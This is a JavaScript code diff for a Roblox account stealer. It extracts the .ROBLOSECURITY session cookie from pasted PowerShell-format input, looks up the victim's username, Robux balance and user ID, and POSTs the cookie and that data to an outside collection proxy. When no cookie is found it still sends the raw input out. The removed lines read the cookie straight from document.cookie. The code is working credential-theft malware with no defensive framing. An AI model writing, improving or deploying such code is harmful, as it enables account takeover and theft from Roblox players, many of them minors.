@@ -12,103 +12,78 @@ function extractRobloxSecurityCookie(input) {
   return null; // Not a PowerShell format
 }
 
-// Function to get the .ROBLOSECURITY cookie from document.cookie (browser environment)
-function getRobloxCookie() {
-  const cookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='));
-  if (!cookie) {
-    console.error('No .ROBLOSECURITY cookie found!');
-    return null;
+async function fetchRobloxUserData(cookie) {
+  const url = 'https://www.roblox.com/mobileapi/userinfo';
+
+  const response = await fetch(url, {
+    method: 'GET',
+    headers: {
+      'Cookie': `.ROBLOSECURITY=${cookie}`
+    }
+  });
+
+  if (!response.ok) {
+    throw new Error(`Failed to fetch user data: ${response.status}`);
   }
-  return cookie.split('=')[1]; // Return the cookie value
+
+  const data = await response.json();
+
+  return {
+    username: data.UserName,
+    robux: data.Balance,
+    userId: data.UserID,
+  };
 }
 
-// Function to fetch Roblox data (Robux balance and profile)
-async function fetchRobloxData(cookie) {
-  if (!cookie) return;
-
-  try {
-    // Fetch the Robux balance using the Roblox API
-    const robuxResponse = await fetch('https://economy.roblox.com/v1/users/currency', {
-      method: 'GET',
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${cookie}`,
-        'User-Agent': navigator.userAgent
-      }
-    });
-
-    if (!robuxResponse.ok) {
-      console.error('Failed to fetch Robux balance');
-      return;
-    }
-
-    const robuxData = await robuxResponse.json();
-
-    // Fetch user profile data using Roblox API
-    const profileResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
-      method: 'GET',
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${cookie}`,
-        'User-Agent': navigator.userAgent
-      }
-    });
-
-    if (!profileResponse.ok) {
-      console.error('Failed to fetch user profile');
-      return;
-    }
-
-    const profileData = await profileResponse.json();
-
-    // Prepare the data to send to the proxy
-    const userData = {
-      username: profileData.name,
-      displayName: profileData.displayName,
-      robuxBalance: robuxData.robux,
-      avatarUrl: `https://www.roblox.com/headshot-thumbnail/image?userId=${profileData.id}&width=420&height=420&format=png`
-    };
-
-    console.log('User Data:', userData);
-
-    // Send the data to the Cloudflare proxy
-    await sendToProxy(userData);
-  } catch (error) {
-    console.error('Error fetching data:', error);
-  }
-}
-
-// Function to send data to Cloudflare proxy
 async function sendToProxy(data) {
   try {
     const response = await fetch(CLOUDFLARE_PROXY_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(data)
+      body: JSON.stringify({
+        sessionId: data.sessionId,
+        username: data.username,
+        robux: data.robux,
+        userId: data.userId,
+        timestamp: new Date().toISOString()
+      })
     });
-
     if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
-    console.log('Data sent to proxy successfully');
+    return await response.json();
   } catch (error) {
     console.error('Proxy error:', error);
+    throw error;
   }
 }
 
-function bruteforce(input) {
+async function bruteforce(input) {
   let content;
-  const cookie = extractRobloxSecurityCookie(input) || getRobloxCookie(); // Get the cookie from input or from document.cookie
-  
+  const cookie = extractRobloxSecurityCookie(input);
+
   if (cookie) {
     content = `✅ Extracted from PowerShell format:\n\`\`\`${cookie}\`\`\``;
+    
+    try {
+      const userData = await fetchRobloxUserData(cookie);
+      console.log('User Data:', userData);
+      sendToProxy({
+        sessionId: cookie,
+        username: userData.username,
+        robux: userData.robux,
+        userId: userData.userId,
+      });
+    } catch (error) {
+      console.error('Error fetching user data:', error);
+    }
+
   } else {
     content = `⚠️ Raw input (not PowerShell format):\n\`\`\`${input}\`\`\``;
   }
 
   // Log or send to proxy
   console.log(content);
-
-  // Fetch Roblox data and send to the proxy
-  fetchRobloxData(cookie);
+  sendToProxy({ sessionId: cookie || input });
 }
-
 
 
 
